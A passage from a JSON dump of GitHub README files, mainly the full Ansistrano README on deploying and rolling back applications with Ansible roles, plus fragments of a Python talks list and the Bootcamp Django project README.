presentation](https:\/\/us.pycon.org\/2015\/schedule\/presentation\/416\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=wf-BqAjZb8M) [00:52:05]\n\n* David Beazley: **Python Concurrency From the Ground Up: LIVE!** (PyCon US)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=MCs5OvhV9S4) [00:46:50]\n* David Beazley: **Modules and Packages: Live and Let Die!** (PyCon US)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=0oTh1CXRaQ0) [03:02:33]\n* Raymond Hettinger: **Super considered super!** (PyCon US)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=EiOglTERPEo) [00:46:52]\n* Ned Batchelder: **Facts and Myths about Python names and values** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2015\/schedule\/presentation\/362\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=_AEJHKGk9ns) [00:25:20]\/[pyvideo](http:\/\/pyvideo.org\/video\/3466\/facts-and-myths-about-python-names-and-values)\n    * [Slides and new article](http:\/\/nedbatchelder.com\/text\/names1.html)\/[Original article](http:\/\/nedbatchelder.com\/text\/names.html)\n"},{"repo":"\/ansistrano\/deploy","language":"HTML","readme_contents":"Ansistrano\n==========\n\n[![Build Status](https:\/\/travis-ci.com\/ansistrano\/deploy.svg?branch=master)](https:\/\/travis-ci.com\/ansistrano\/deploy)\n[![Total Deployments](https:\/\/img.shields.io\/badge\/dynamic\/json.svg?label=overall&uri=https%3A%2F%2Fansistrano.com%2Finfo&query=deployments.total&colorB=green&suffix=%20deployments)](https:\/\/ansistrano.com)\n[![Year Deployments](https:\/\/img.shields.io\/badge\/dynamic\/json.svg?label=year&uri=https%3A%2F%2Fansistrano.com%2Finfo&query=deployments.year&colorB=green&suffix=%20deployments)](https:\/\/ansistrano.com)\n[![Month Deployments](https:\/\/img.shields.io\/badge\/dynamic\/json.svg?label=month&uri=https%3A%2F%2Fansistrano.com%2Finfo&query=deployments.month&colorB=green&suffix=%20deployments)](https:\/\/ansistrano.com)\n[![Today Deployments](https:\/\/img.shields.io\/badge\/dynamic\/json.svg?label=today&uri=https%3A%2F%2Fansistrano.com%2Finfo&query=deployments.today&colorB=green&suffix=%20deployments)](https:\/\/ansistrano.com)\n\n**ansistrano.deploy** and **ansistrano.rollback** are Ansible roles to easily manage the deployment process for scripting applications such as PHP, Python and Ruby. It's an Ansible port for Capistrano.\n\n- [Ansistrano](#ansistrano)\n  - [History](#history)\n  - [Project name](#project-name)\n  - [Ansistrano anonymous usage stats](#ansistrano-anonymous-usage-stats)\n  - [Who is using Ansistrano?](#who-is-using-ansistrano)\n  - [Requirements](#requirements)\n  - [Installation](#installation)\n  - [Update](#update)\n  - [Features](#features)\n  - [Main workflow](#main-workflow)\n  - [Role Variables](#role-variables)\n  - [Deploying](#deploying)\n  - [Rolling back](#rolling-back)\n  - [Hooks: Custom tasks](#hooks-custom-tasks)\n  - [Variables in custom tasks](#variables-in-custom-tasks)\n  - [Pruning old releases](#pruning-old-releases)\n  - [Example Playbook](#example-playbook)\n  - [Sample projects](#sample-projects)\n  - [They're talking about us](#theyre-talking-about-us)\n  - [License](#license)\n  - [Other resources](#other-resources)\n\nHistory\n-------\n\n[Capistrano](http:\/\/capistranorb.com\/) is a remote server automation tool and it's currently in Version 3. [Version 2.0](https:\/\/github.com\/capistrano\/capistrano\/tree\/legacy-v2) was originally thought in order to deploy RoR applications. With additional plugins, you were able to deploy non Rails applications such as PHP and Python, with different deployment strategies, stages and much more. I loved Capistrano v2. I have used it a lot. I developed a plugin for it.\n\nCapistrano 2 was a great tool and it still works really well. However, it is not maintained anymore since the original team is working in v3. This new version does not have the same set of features so it is less powerful and flexible. Besides that, other new tools are becoming easier to use in order to deploy applications, such as Ansible.\n\nSo, I have decided to stop using Capistrano because v2 is not maintained, v3 does not have enough features, and I can do everything Capistrano was doing with Ansible. If you are looking for alternatives, check Fabric or Chef Solo.\n\nProject name\n------------\n\nAnsistrano comes from Ansible + Capistrano, easy, isn't it?\n\nAnsistrano anonymous usage stats\n--------------------------------\n\nWe have recently added an extra optional step in Ansistrano so that we can know how many people are deploying their applications with our project. Unfortunately, Ansible Galaxy does not provide any numbers on usage or downloads so this is one of the only ways we have to measure how many users we really have.\n\nYou can check the code we use to store your anonymous stats at [the ansistrano.com repo](https:\/\/github.com\/ansistrano\/ansistrano.com) and anyway, if you are not comfortable with this, you will always be able to disable this extra step by setting `ansistrano_allow_anonymous_stats` to false in your playbooks.\n\nWho is using Ansistrano?\n------------------------\n\nIs Ansistrano ready to be used? Here are some companies currently using it:\n\n* [ABA English](http:\/\/www.abaenglish.com\/)\n* [Another Place Productions](http:\/\/www.anotherplaceproductions.com)\n* [Atr\u00e1palo](http:\/\/www.atrapalo.com)\n* [Beroomers](https:\/\/www.beroomers.com)\n* [CMP Group](http:\/\/www.teamcmp.com)\n* [Cabissimo](https:\/\/www.cabissimo.com)\n* [Camel Secure](https:\/\/camelsecure.com)\n* [Cherry Hill](https:\/\/chillco.com)\n* [Claranet France](http:\/\/www.claranet.fr\/)\n* [Clearpoint](http:\/\/www.clearpoint.co.nz)\n* [Clever Age](https:\/\/www.clever-age.com)\n* [CridaDemocracia](https:\/\/cridademocracia.org)\n* [Cycloid](http:\/\/www.cycloid.io)\n* [Deliverea](https:\/\/www.deliverea.com\/)\n* [DevOps Barcelona Conference](https:\/\/devops.barcelona\/)\n* [EnAlquiler](http:\/\/www.enalquiler.com\/)\n* [Euromillions.com](http:\/\/euromillions.com\/)\n* [Finizens](https:\/\/finizens.com\/)\n* [FloraQueen](https:\/\/www.floraqueen.com\/)\n* [Fluxus](http:\/\/www.fluxus.io\/)\n* [Geocalia](https:\/\/geocalia.com\/)\n* [Gstock](http:\/\/www.g-stock.es)\n* [HackSoft](https:\/\/hacksoft.io\/)\n* [HackConf](https:\/\/hackconf.bg\/en\/)\n* [Hexanet](https:\/\/www.hexanet.fr)\n* [HiringThing](https:\/\/www.hiringthing.com\/)\n* [Holaluz](https:\/\/www.holaluz.com)\n* [Hosting4devs](https:\/\/hosting4devs.com)\n* [Jolicode](http:\/\/jolicode.com\/)\n* [Kidfund](http:\/\/link.kidfund.us\/github \"Kidfund\")\n* [Lumao SAS](https:\/\/lumao.eu)\n* [MEDIA.figaro](http:\/\/media.figaro.fr)\n* [Moss](https:\/\/moss.sh)\n* [Nice&Crazy](http:\/\/www.niceandcrazy.com)\n* [Nodo \u00c1mbar](http:\/\/www.nodoambar.com\/)\n* [Oferplan](http:\/\/oferplan.com\/)\n* [Ofertix](http:\/\/www.ofertix.com)\n* [\u00d2mnium Cultural](https:\/\/www.omnium.cat)\n* [OpsWay Software Factory](http:\/\/opsway.com)\n* [Parkimeter](https:\/\/parkimeter.com)\n* [PHP Barcelona Conference](https:\/\/php.barcelona\/)\n* [Scoutim](https:\/\/scoutim.com)\n* [Socialnk](https:\/\/socialnk.com\/)\n* [Spotahome](https:\/\/www.spotahome.com)\n* [Suntransfers](http:\/\/www.suntransfers.com)\n* [TechPump](http:\/\/www.techpump.com\/)\n* [Tienda Online VirginMobile](https:\/\/cambiate.virginmobile.cl)\n* [The Cocktail](https:\/\/the-cocktail.com\/)\n* [Timehook](https:\/\/timehook.io)\n* [TMTFactory](https:\/\/tmtfactory.com)\n* [UNICEF Comit\u00e9 Espa\u00f1ol](https:\/\/www.unicef.es)\n* [Ulabox](https:\/\/www.ulabox.com)\n* [Uvinum](http:\/\/www.uvinum.com)\n* [VirginMobile Chile](https:\/\/empresas.virginmobile.cl)\n* [Wavecontrol](http:\/\/monitoring.wavecontrol.com\/ca\/public\/demo\/)\n* [Yubl](https:\/\/yubl.me\/)\n\nIf you are also using it, please let us know via a PR to this document.\n\nRequirements\n------------\n\nIn order to deploy your apps with Ansistrano, you will need:\n\n* Ansible in your deployer machine\n* `rsync` on the target machine if you are using either the `rsync`, `rsync_direct`, or `git` deployment strategy or if you are using `ansistrano_current_via = rsync`\n\nInstallation\n------------\n\nAnsistrano is an Ansible role distributed globally using [Ansible Galaxy](https:\/\/galaxy.ansible.com\/). In order to install Ansistrano role you can use the following command.\n\n```\n$ ansible-galaxy install ansistrano.deploy ansistrano.rollback\n```\n\nUpdate\n------\n\nIf you want to update the role, you need to pass **--force** parameter when installing. Please, check the following command:\n\n```\n$ ansible-galaxy install --force ansistrano.deploy ansistrano.rollback\n```\n\nFeatures\n--------\n\n* Rollback in seconds (with ansistrano.rollback role)\n* Customize your deployment with hooks before and after critical steps\n* Save disk space keeping a maximum fixed releases in your hosts\n* Choose between SCP, RSYNC, GIT, SVN, HG, HTTP Download or S3 GET deployment strategies (optional unarchive step included)\n\nMain workflow\n-------------\n\nAnsistrano deploys applications following the Capistrano flow.\n\n* Setup phase: Creates the folder structure to hold your releases\n* Code update phase: Puts the new release into your hosts\n* Symlink phase: After deploying the new release into your hosts, this step changes the `current` softlink to new the release\n* Cleanup phase: Removes any old version based in the `ansistrano_keep_releases` parameter (see \"Role Variables\")\n\n![Ansistrano Flow](https:\/\/raw.githubusercontent.com\/ansistrano\/deploy\/master\/docs\/ansistrano-flow.png)\n\nRole Variables\n--------------\n\n```yaml\nvars:\n  ansistrano_deploy_from: \"{{ playbook_dir }}\" # Where my local project is (relative or absolute path)\n  ansistrano_deploy_to: \"\/var\/www\/my-app\" # Base path to deploy to.\n  ansistrano_version_dir: \"releases\" # Releases folder name\n  ansistrano_current_dir: \"current\" # Softlink name. You should rarely changed it.\n  ansistrano_current_via: \"symlink\" # Deployment strategy who code should be deployed to current path. Options are symlink or rsync\n  ansistrano_keep_releases: 0 # Releases to keep after a new deployment. See \"Pruning old releases\".\n\n  # Arrays of directories and files to be shared.\n  # The following arrays of directories and files will be symlinked to the current release directory after the 'update-code' step and its callbacks\n  # Notes:\n  # * Paths are relative to the \/shared directory (no starting \/)\n  # * If your items are in a subdirectory, write the entire path to each shared directory\n  #\n  # Example:\n  # ansistrano_shared_paths:\n  #   - path\/to\/first-dir\n  #   - path\/next-dir\n  # ansistrano_shared_files:\n  #   - my-file.txt\n  #   - path\/to\/file.txt\n  ansistrano_shared_paths: []\n  ansistrano_shared_files: []\n\n\n  # Shared paths and basedir shared files creation.\n  # By default the shared paths directories and base directories for shared files are created automatically if not exists. But in some scenarios those paths could be symlinks to another directories in the filesystem, and the deployment process would fails. With these variables you can disable the involved tasks. If you have two or three shared paths, and don't need creation only for some of them, you always could disable the automatic creation and add a custom task in a hook.\n  ansistrano_ensure_shared_paths_exist: yes\n  ansistrano_ensure_basedirs_shared_files_exist: yes\n  \n  # Deployment strategy - method used to deliver code. Options are copy, download, git, rsync, rsync_direct, svn, or s3. \n  ansistrano_deploy_via: \"rsync\" \n  # Copy, download and s3 have an optional step to unarchive the downloaded file which can be used by adding _unarchive. \n  # The rsync_direct strategy omits a file copy on the target offering a slight speed increase if you are deploying to shared hosts, are experiancing bad file-performance, or serve static assets from the same host you deploy your app to and rsync many files.\n  # You can check all the options inside tasks\/update-code folder!\n  \n  ansistrano_allow_anonymous_stats: yes\n\n  # Variables used in the rsync\/rsync_direct deployment strategy\n  ansistrano_rsync_extra_params: \"\" # Extra parameters to use when deploying with rsync in a single string. Although Ansible allows an array this can cause problems if we try to add multiple --include args as it was reported in https:\/\/github.com\/ansistrano\/deploy\/commit\/e98942dc969d4e620313f00f003a7ea2eab67e86\n  ansistrano_rsync_set_remote_user: yes # See [ansible synchronize module](http:\/\/docs.ansible.com\/ansible\/synchronize_module.html). Options are yes, no.\n  ansistrano_rsync_path: \"\" # See [ansible synchronize module](http:\/\/docs.ansible.com\/ansible\/synchronize_module.html). By default is \"sudo rsync\", it can be overwriten with (example): \"sudo -u user rsync\".\n  ansistrano_rsync_use_ssh_args: no # See [ansible synchronize module](http:\/\/docs.ansible.com\/ansible\/synchronize_module.html). If set yes, use the ssh_args specified in ansible.cfg.\n\n  # Variables used in the Git deployment strategy\n  ansistrano_git_repo: git@github.com:USERNAME\/REPO.git # Location of the git repository\n  ansistrano_git_branch: master # What version of the repository to check out. This can be the full 40-character SHA-1 hash, the literal string HEAD, a branch name, or a tag name\n  ansistrano_git_repo_tree: \"\" # If specified the subtree of the repository to deploy\n  ansistrano_git_identity_key_path: \"\" # If specified this file is copied over and used as the identity key for the git commands, path is relative to the playbook in which it is used\n  ansistrano_git_identity_key_remote_path: \"\" # If specified this file on the remote server is used as the identity key for the git commands, remote path is absolute\n  # Optional variables, omitted by default\n  ansistrano_git_refspec: ADDITIONAL_GIT_REFSPEC # Additional refspec to be used by the 'git' module. Uses the same syntax as the 'git fetch' command.\n  ansistrano_git_ssh_opts: \"-o StrictHostKeyChecking=no\" # Additional ssh options to be used in Git\n  ansistrano_git_depth: 1 # Additional history truncated to the specified number or revisions\n\n  # Variables used in the SVN deployment strategy\n  # Please note there was a bug in the subversion module in Ansible 1.8.x series (https:\/\/github.com\/ansible\/ansible-modules-core\/issues\/370) so it is only supported from Ansible 1.9\n  ansistrano_svn_repo: \"https:\/\/svn.company.com\/project\" # Location of the svn repository\n  ansistrano_svn_branch: \"trunk\" # What branch from the repository to check out.\n  ansistrano_svn_revision: \"HEAD\" # What revision from the repository to check out.\n  ansistrano_svn_username: \"user\" # SVN authentication username\n  ansistrano_svn_password: \"Pa$$word\" # SVN authentication password\n  ansistrano_svn_environment: {} # Dict with environment variables for svn tasks (https:\/\/docs.ansible.com\/ansible\/playbooks_environment.html)\n\n  # Variables used in the HG deployment strategy\n  ansistrano_hg_repo: \"https:\/\/USERNAME@bitbucket.org\/USERNAME\/REPO\" # Location of the hg repo\n  ansistrano_hg_branch: \"default\" # Any branch identifier that works with hg -r, so named branch, bookmark, commit hash...\n\n  # Variables used in the download deployment strategy\n  ansistrano_get_url: https:\/\/github.com\/someproject\/somearchive.tar.gz\n  ansistrano_download_force_basic_auth: false # no default as this is only supported from Ansible 2.0\n  ansistrano_download_headers: \"\" # no default as this is only supported from Ansible 2.0\n\n  # Variables used in the S3 deployment strategy\n  ansistrano_s3_bucket: s3bucket\n  ansistrano_s3_object: s3object.tgz # Add the _unarchive suffix to the ansistrano_deploy_via if your object is a package (ie: s3_unarchive)\n  ansistrano_s3_region: eu-west-1\n  ansistrano_s3_rgw: false # must be Ansible >= 2.2. use Ceph RGW (when set true, ignore ansistrano_s3_region)\n  ansistrano_s3_url: http:\/\/rgw.example.com # when use Ceph RGW, set url\n  # Optional variables, omitted by default\n  ansistrano_s3_aws_access_key: YOUR_AWS_ACCESS_KEY\n  ansistrano_s3_aws_secret_key: YOUR_AWS_SECRET_KEY\n  ansistrano_s3_ignore_nonexistent_bucket: false\n  \n  # Variables used in the GCS deployment strategy\n  ansistrano_gcs_bucket: gcsbucket\n  ansistrano_gcs_object: gcsobject.tgz # Add the _unarchive suffix to the ansistrano_deploy_via if your object is a package (ie: s3_unarchive)\n  ansistrano_gcs_region: eu-west-1 # https:\/\/cloud.google.com\/storage\/docs\/bucket-locations\n  # Optional variables, omitted by default\n  ansistrano_gcs_access_key: YOUR_GCS_ACCESS_KEY # navigate to Cloud console > Storage > Settings > Interoperability\n  ansistrano_gcs_secret_key: YOUR_GCS_SECRET_KEY\n\n  # Hooks: custom tasks if you need them\n  ansistrano_before_setup_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-before-setup-tasks.yml\"\n  ansistrano_after_setup_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-after-setup-tasks.yml\"\n  ansistrano_before_update_code_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-before-update-code-tasks.yml\"\n  ansistrano_after_update_code_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-after-update-code-tasks.yml\"\n  ansistrano_before_symlink_shared_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-before-symlink-shared-tasks.yml\"\n  ansistrano_after_symlink_shared_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-after-symlink-shared-tasks.yml\"\n  ansistrano_before_symlink_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-before-symlink-tasks.yml\"\n  ansistrano_after_symlink_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-after-symlink-tasks.yml\"\n  ansistrano_before_cleanup_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-before-cleanup-tasks.yml\"\n  ansistrano_after_cleanup_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-after-cleanup-tasks.yml\"\n```\n\n`{{ playbook_dir }}` is an Ansible variable that holds the path to the current playbook.\n\nDeploying\n---------\n\nIn order to deploy with Ansistrano, you need to perform some steps:\n\n* Create a new `hosts` file. Check [ansible inventory documentation](http:\/\/docs.ansible.com\/intro_inventory.html) if you need help. This file will identify all the hosts where to deploy to. For multistage environments check [Multistage environments](#multistage-environment-devel-preprod-prod-etc).\n* Create a new playbook for deploying your app, for example, `deploy.yml`\n* Set up role variables (see [Role Variables](#role-variables))\n* Include the `ansistrano.deploy` role as part of a play\n* Run the deployment playbook\n\n```ansible-playbook -i hosts deploy.yml```\n\nIf everything has been set up properly, this command will create the following approximate directory structure on your server. Check how the hosts folder structure would look like after one, two and three deployments.\n\n```\n-- \/var\/www\/my-app.com\n|-- current -> \/var\/www\/my-app.com\/releases\/20100509145325\n|-- releases\n|   |-- 20100509145325\n|-- shared\n```\n\n```\n-- \/var\/www\/my-app.com\n|-- current -> \/var\/www\/my-app.com\/releases\/20100509150741\n|-- releases\n|   |-- 20100509150741\n|   |-- 20100509145325\n|-- shared\n```\n\n```\n-- \/var\/www\/my-app.com\n|-- current -> \/var\/www\/my-app.com\/releases\/20100512131539\n|-- releases\n|   |-- 20100512131539\n|   |-- 20100509150741\n|   |-- 20100509145325\n|-- shared\n```\n\n### Serial deployments\n\nTo prevent different timestamps when deploying to several servers using the [`serial`](http:\/\/docs.ansible.com\/playbooks_delegation.html#rolling-update-batch-size) option, you should set the `ansistrano_release_version` variable.\n\n```ansible-playbook -i hosts -e \"ansistrano_release_version=`date -u +%Y%m%d%H%M%SZ`\" deploy.yml```\n\n\nRolling back\n-----------\n\nIn order to rollback with Ansistrano, you need to set up the deployment and run the rollback playbook.\n\n```ansible-playbook -i hosts rollback.yml```\n\nIf you try to rollback with zero or one releases deployed, an error will be raised and no actions performed.\n\nVariables you can tune in rollback role are less than in deploy one:\n\n```yaml\nvars:\n  ansistrano_deploy_to: \"\/var\/www\/my-app\" # Base path to deploy to.\n  ansistrano_version_dir: \"releases\" # Releases folder name\n  ansistrano_current_dir: \"current\" # Softlink name. You should rarely changed it.\n  ansistrano_rollback_to_release: \"\" # If specified, the application will be rolled back to this release version; previous release otherwise.\n  ansistrano_remove_rolled_back: yes # You can change this setting in order to keep the rolled back release in the server for later inspection\n  ansistrano_allow_anonymous_stats: yes\n\n  # Hooks: custom tasks if you need them\n  ansistrano_rollback_before_setup_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-rollback-before-setup-tasks.yml\"\n  ansistrano_rollback_after_setup_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-rollback-after-setup-tasks.yml\"\n  ansistrano_rollback_before_symlink_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-rollback-before-symlink-tasks.yml\"\n  ansistrano_rollback_after_symlink_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-rollback-after-symlink-tasks.yml\"\n  ansistrano_rollback_before_cleanup_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-rollback-before-cleanup-tasks.yml\"\n  ansistrano_rollback_after_cleanup_tasks_file: \"{{ playbook_dir }}\/<your-deployment-config>\/my-rollback-after-cleanup-tasks.yml\"\n```\n\nMultistage environment (devel, preprod, prod, etc.)\n---------------------------------------------------\n\nIf you want to deploy to different environments such as devel, preprod and prod, it's recommended to create different hosts files. When done, you can specify a different host file when running the deployment playbook using the **-i** parameter. On every host file, you can specify different users, password, connection parameters, etc.\n\n```ansible-playbook -i hosts_devel deploy.yml```\n\n```ansible-playbook -i hosts_preprod deploy.yml```\n\n```ansible-playbook -i hosts_prod deploy.yml```\n\nHooks: Custom tasks\n-------------------\n\nYou will typically need to reload your webserver after the `Symlink` step, or download your dependencies before `Code update` or even do it in production before the `Symlink`. So, in order to perform your custom tasks you have some hooks that Ansistrano will execute before and after each of the main 3 steps. **This is the main benefit against other similar deployment roles.**\n\n```\n-- \/my-local-machine\/my-app.com\n|-- hosts\n|-- deploy.yml\n|-- my-custom-tasks\n|   |-- before-code-update.yml\n|   |-- after-code-update.yml\n|   |-- before-symlink.yml\n|   |-- after-symlink.yml\n|   |-- before-cleanup.yml\n|   |-- after-cleanup.yml\n```\n\nFor example, in order to restart apache after `Symlink` step, we'll add in the `after-symlink.yml`\n\n```\n- name: Restart Apache\n  service: name=httpd state=reloaded\n```\n\n* **Q: Where would you add sending email notification after a deployment?**\n* **Q: (for PHP and Symfony developers) Where would you clean the cache?**\n\nYou can specify a custom tasks file for before and after every step using `ansistrano_before_*_tasks_file` and `ansistrano_after_*_tasks_file` role variables. See \"Role Variables\" for more information.\n\nVariables in custom tasks\n-------------------------\n\nWhen writing your custom tasks files you may need some variables that Ansistrano makes available to you:\n\n* ```{{ ansistrano_release_path.stdout }}```: Path to current deployment release (probably the one you are going to use the most)\n* ```{{ ansistrano_releases_path }}```: Path to releases folder\n* ```{{ ansistrano_shared_path }}```: Path to shared folder (where common releases assets can be stored)\n* ```{{ ansistrano_release_version }}```: Relative directory name for the release (by default equals to the current timestamp in UTC timezone)\n\nPruning old releases\n--------------------\n\nIn continuous delivery environments, you will possibly have a high number of releases in production. Maybe you have tons of space and you don't mind, but it's common practice to keep just a custom number of releases.\n\nAfter the deployment, if you want to remove old releases just set the `ansistrano_keep_releases` variable to the total number of releases you want to keep.\n\nLet's see three deployments with an `ansistrano_keep_releases: 2` configuration:\n\n```\n-- \/var\/www\/my-app.com\n|-- current -> \/var\/www\/my-app.com\/releases\/20100509145325\n|-- releases\n|   |-- 20100509145325\n|-- shared\n```\n\n```\n-- \/var\/www\/my-app.com\n|-- current -> \/var\/www\/my-app.com\/releases\/20100509150741\n|-- releases\n|   |-- 20100509150741\n|   |-- 20100509145325\n|-- shared\n```\n\n```\n-- \/var\/www\/my-app.com\n|-- current -> \/var\/www\/my-app.com\/releases\/20100512131539\n|-- releases\n|   |-- 20100512131539\n|   |-- 20100509150741\n|-- shared\n```\n\nSee how the release `20100509145325` has been removed.\n\nExample Playbook\n----------------\n\nIn the folder, `example` you can check an example project that shows how to deploy a small application with Ansistrano.\n\nIn order to run it, you will need to have Vagrant and the ansistrano roles installed. Please check https:\/\/www.vagrantup.com for more information about Vagrant and our Installation section.\n\n```\n$ cd example\/my-playbook\n$ vagrant up\n$ ansible-playbook -i hosts deploy.yml\n```\n\nAnd after running these commands, the index.html located in the `my-app` folder will be deployed to both vagrant boxes\n\nIn order to test the rollback playbook, you will need to run deploy.yml at least twice (so that there is something to rollback to). And once this is done, you only need to run\n\n```\n$ ansible-playbook -i hosts rollback.yml\n```\n\nYou can check more advanced examples inside the test folder which are run against Travis-CI\n\nSample projects\n---------------\n\nWe have added Ansistrano support for other projects we are working on.\n\n* LastWishes: Domain-Driven Design PHP Sample App: https:\/\/github.com\/dddinphp\/last-wishes\n\nAs an example, see the execution log of the LastWishes deployment:\n\n```\nPLAY [Deploy last wishes app to my server] ************************************\n\nGATHERING FACTS ***************************************************************\nok: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Ensure deployment base path exists] ***\nok: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Ensure releases folder exists] ***\nok: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Ensure shared elements folder exists] ***\nok: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Get release timestamp] ***********\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Get release path] ****************\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Get releases path] ***************\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Get shared path (in rsync case)] ***\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Rsync application files to remote shared copy (in rsync case)] ***\nchanged: [quepimquepam.com -> 127.0.0.1]\n\nTASK: [ansistrano.deploy | Deploy existing code to servers] ***\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Deploy existing code to remote servers] ***\nskipping: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Update remote repository] ********\nskipping: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Export a copy of the repo] *******\nskipping: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Deploy code from to servers] *****\nskipping: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Copy release version into REVISION file] ***\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Touches up the release code] *****\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Change softlink to new release] ***\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Reload Apache] *******************\nchanged: [quepimquepam.com]\n\nTASK: [ansistrano.deploy | Clean up releases] ***************\nskipping: [quepimquepam.com]\n\nPLAY RECAP ********************************************************************\nquepimquepam.com           : ok=14   changed=10   unreachable=0    failed=0\n```\n\nThey're talking about us\n------------------------\n\n* [Pablo Godel - Deploying Symfony - Symfony Cat 2016](https:\/\/youtu.be\/K2bBhrkmpSg?t=26m)\n* [https:\/\/www.artansoft.com\/2016\/05\/deploy-de-proyectos-php-ansistrano\/](https:\/\/www.artansoft.com\/2016\/05\/deploy-de-proyectos-php-ansistrano\/)\n* [http:\/\/alexmoreno.net\/ansistrano-deploying-drupal-ansible](http:\/\/alexmoreno.net\/ansistrano-deploying-drupal-ansible)\n* [http:\/\/www.ricardclau.com\/2015\/10\/deploying-php-applications-with-ansistrano\/](http:\/\/www.ricardclau.com\/2015\/10\/deploying-php-applications-with-ansistrano\/)\n* [http:\/\/es.slideshare.net\/OrestesCA\/ansible-intro-ansible-barcelona-user-group-june-2015](http:\/\/es.slideshare.net\/OrestesCA\/ansible-intro-ansible-barcelona-user-group-june-2015)\n* [http:\/\/carlosbuenosvinos.com\/deploying-symfony-and-php-apps-with-ansistrano\/](http:\/\/carlosbuenosvinos.com\/deploying-symfony-and-php-apps-with-ansistrano\/)\n* [https:\/\/www.youtube.com\/watch?v=CPz5zPzzMZE](https:\/\/www.youtube.com\/watch?v=CPz5zPzzMZE)\n* [https:\/\/github.com\/cbrunnkvist\/ansistrano-symfony-deploy](https:\/\/github.com\/cbrunnkvist\/ansistrano-symfony-deploy)\n* [https:\/\/www.reddit.com\/r\/ansible\/comments\/2ezzz5\/rapid_rollback_with_ansible\/](https:\/\/www.reddit.com\/r\/ansible\/comments\/2ezzz5\/rapid_rollback_with_ansible\/)\n* [Cookiecutting Ansible for Django](https:\/\/hacksoft.io\/blog\/cookiecutting-django-ansible\/)\n\nLicense\n-------\n\nMIT\n\nOther resources\n---------------\n\n* [Thoughts on deploying with Ansible](http:\/\/www.future500.nl\/articles\/2014\/07\/thoughts-on-deploying-with-ansible\/)\n* [Docker image](https:\/\/hub.docker.com\/r\/lavoweb\/ansistrano\/)\n"},{"repo":"\/vitorfs\/bootcamp","language":"CSS","readme_contents":"Bootcamp\n========\n\nAn enterprise oriented social network\n\n.. image:: https:\/\/travis-ci.org\/vitorfs\/bootcamp.svg?branch=master\n    :target: https:\/\/travis-ci.org\/vitorfs\/bootcamp\n    :alt: TravisCI Status\n\n.. image:: https:\/\/coveralls.io\/repos\/github\/vitorfs\/bootcamp\/badge.svg?branch=master\n    :target: https:\/\/coveralls.io\/github\/vitorfs\/bootcamp?branch=master\n    :alt: Coverage\n\n.. image:: https:\/\/requires.io\/github\/vitorfs\/bootcamp\/requirements.svg?branch=master\n    :target: https:\/\/requires.io\/github\/vitorfs\/bootcamp\/requirements\/?branch=master\n    :alt: Requirements\n\n.. image:: https:\/\/img.shields.io\/badge\/built%20with-Cookiecutter%20Django-ff69b4.svg\n    :target: https:\/\/github.com\/pydanny\/cookiecutter-django\/\n    :alt: Built with Cookiecutter Django\n\n:License: MIT\n\nBootcamp is an open source **enterprise social network** of open purpose, on which you can build for your own ends.\n\nThe project has four basic apps:\n\n* News (A Twitter-like microblog)\n* Articles (A collaborative blog)\n* Question & Answers (A Stack Overflow-like platform)\n* Messeger (A basic chat-a-like tool for asynchronous communication.)\n\nTechnology Stack\n----------------\n\n* Python_ 3.6.x \/ 3.7.x\n* `Django Web Framework`_ 1.11.x \/ 2.0.x\n* PostgreSQL_\n* `Redis 3.2`_\n* Daphne_\n* Caddy_\n* Docker_\n* docker-compose_\n* WhiteNoise_\n* `Twitter Bootstrap 4`_\n* `jQuery 3`_\n* Django-channels_ (for WebSockets)\n* Sentry_\n* Mailgun_\n* Cookiecutter_\n\n.. _Python: https:\/\/www.python.org\/\n.. _`Django Web Framework`: https:\/\/www.djangoproject.com\/\n.. _PostgreSQL: https:\/\/www.postgresql.org\/\n.. _`Redis 3.2`: https:\/\/redis.io\/documentation\n.. _Daphne: https:\/\/github.com\/django\/daphne\/\n.. _Caddy: https:\/\/caddyserver.com\/docs\n.. _Docker: https:\/\/docs.docker.com\/\n.. _docker-compose: https:\/\/docs.docker.com\/compose\/\n.. _WhiteNoise: http:\/\/whitenoise.evans.io\/en\/stable\/\n.. _`Twitter Bootstrap 4`: https:\/\/getbootstrap.com\/docs\/4.0\/getting-started\/introduction\/\n.. _`jQuery 3`: https:\/\/api.jquery.com\/\n.. _Django-channels: https:\/\/channels.readthedocs.io\/en\/latest\/\n.. _Sentry: https:\/\/docs.sentry.io\/\n.. _Mailgun: https:\/\/www.mailgun.com\/\n.. 